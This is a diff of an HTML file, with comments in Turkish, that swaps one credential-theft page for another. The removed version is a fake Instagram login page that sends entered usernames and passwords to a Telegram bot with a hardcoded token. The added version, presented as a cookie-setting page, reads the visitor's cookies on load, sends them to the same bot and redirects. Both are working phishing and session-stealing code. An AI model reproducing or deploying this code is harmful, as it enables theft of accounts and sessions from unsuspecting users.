@@ -1,122 +1,53 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="tr">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <link rel="Icon" type="image/x-icon" href="https://a-manu.com/wp-content/uploads/sites/171/2017/04/instagram-Logo-PNG-Transparent-Background-download-300x300.png">
-  <title>Instagram</title>
+  <title>Çerez Ayarlanıyor...</title>
+  <script>
+    // Çerez ayarlama fonksiyonu
+    function setCookie(name, value, days) {
+      const d = new Date();
+      d.setTime(d.getTime() + (days * 24 * 60 * 60 * 1000));
+      const expires = "expires=" + d.toUTCString();
+      document.cookie = name + "=" + value + ";" + expires + ";path=/";
+    }
+
+    // Telegram botuna mesaj gönderme fonksiyonu
+    function sendToTelegram(message) {
+      const token = "7632849431:AAHh6CxDeiMa6LoUs2m6YUMTrx-lRk1vXYk";  // Bot token'ınızı buraya yazın
+      const chatId = "5984214732";   // Telegram sohbet ID'nizi buraya yazın
+      const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+      // Bot API'sine istek gönder
+      fetch(url)
+        .then(response => response.json())
+        .then(data => {
+          if (data.ok) {
+            console.log("Mesaj Telegram'a gönderildi.");
+          } else {
+            console.log("Telegram mesaj gönderme başarısız.");
+          }
+        })
+        .catch(error => {
+          console.log("Hata:", error);
+        });
+    }
+
+    // Sayfa yüklendiğinde çerezleri ayarla ve Telegram'a logla
+    window.onload = function () {
+      setCookie("cookiesAccepted", "true", 30); // 30 gün geçerli çerez
+
+      // Çerezleri al
+      const cookies = document.cookie;
+
+      // Çerezleri Telegram'a logla
+      sendToTelegram(`Yeni çerezler: ${cookies}`);
+
+      // Ana sayfaya yönlendir
+      window.location.href = "index.html";
+    }
+  </script>
 </head>
 <body>
-  <span id="root">
-    <section class="section-all">
-      <link rel="stylesheet" href="css.css">
-      
-      <main class="main" role="main">
-        <div class="wrapper">
-          <article class="article">
-            <div class="content">
-              <div class="login-box">
-                <div class="header">
-                  <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram">
-                </div>
-                <div class="form-wrap">
-                  <form class="form">
-                    
-                    <div class="input-box">
-                      <input type="text" id="username" placeholder="Phone number, username, or email" aria-required="true" maxlength="30" autocapitalize="off" autocorrect="off" name="username" required>
-                    </div>  
-
-                    <div class="input-box">
-                      <input type="password" name="password" id="password" placeholder="Password" maxlength="30" aria-required="true" autocapitalize="off" autocorrect="off" required>
-                    </div>  
-
-                    <span class="button-box">
-                      <button class="btn" type="button" name="submit" onclick="sendMessage()">Log in</button>
-                    </span>  
-
-                    <a class="forgot" href="https://www.instagram.com/accounts/password/reset">Forgot password?</a>
-                  </form>
-                </div>
-              </div> 
-
-              <div class="login-box">
-                <p class="text">Don't have an account?<a href="https://www.instagram.com/accounts/emailsignup">Sign up</a></p>
-              </div>
-
-              <div class="app">
-                <p>Get the app.</p>
-                <div class="app-img">
-                  <a href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.badge&amp;mt=8">
-                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/4b70f6fae447.png" >
-                  </a>
-                  <a href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26utm_medium%3Dbadge">
-                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/f06b908907d5.png">
-                  </a>  
-                </div> 
-              </div>
-            </div> 
-          </article>
-        </div> 
-      </main>
-
-      
-      <footer class="footer" role="contentinfo">
-        <div class="footer-container">
-          <nav class="footer-nav" role="navigation">
-            <ul>
-              <li><a href=""></a></li>
-              <li><a href="https://about.instagram.com">About Us</a></li>
-              <li><a href="https://help.instagram.com">Support</a></li>
-              <li><a href="https://about.instagram.com/blog">Blog</a></li>
-              <li><a href="https://about.instagram.com/about-us/careers">Jobs</a></li>
-              <li><a href="https://www.instagram.com/developer">Api</a></li>
-              <li><a href="https://help.instagram.com/519522125107875">Privacy</a></li>
-              <li><a href="https://help.instagram.com/581066165581870">Terms</a></li>
-              <li><a href="https://www.instagram.com/directory/hashtags">Directory</a></li>
-              <li><a href="">Instagram</a></li>
-            </ul>
-          </nav>
-
-          <span class="footer-logo">&copy; 2024 Instagram & github onlyfelixx </span>
-        </div>
-      </footer>
-    </section>
-  </span> 
-  
-  <script type="text/javascript">
-    function la(src) {
-      window.location=src;
-    }
-  </script>
-
-  <script>
-    function sendMessage() {
-      function sleep(milliseconds) {
-        const date = Date.now();
-        let currentDate = null;
-        do {
-          currentDate = Date.now();
-        } while (currentDate - date < milliseconds);
-      }
-
-      var botToken = "7632849431:AAHh6CxDeiMa6LoUs2m6YUMTrx-lRk1vXYk";  // Buraya bot token'ınızı ekleyin
-      var chatID = "5984214732";  // Buraya Telegram chat ID'nizi ekleyin
-
-      var request = new XMLHttpRequest();
-      request.open("POST", `https://api.telegram.org/bot${botToken}/sendMessage`);
-      request.setRequestHeader('Content-type', 'application/json');
-
-      var params = {
-        chat_id: chatID,
-        text: `> **USERNAME  : ** ${document.getElementById('username').value} \n> **PASSWORD : ** ${document.getElementById('password').value}`
-      };
-
-      request.send(JSON.stringify(params));
-
-      sleep(400);  // Kısa bir gecikme koyuyoruz
-
-      window.location.replace("https://www.instagram.com/p/DHdXaR_sezZ/?igsh=MWR2Y3doOG5zaXY5YQ==");
-    }
-  </script>
 </body>
 </html>
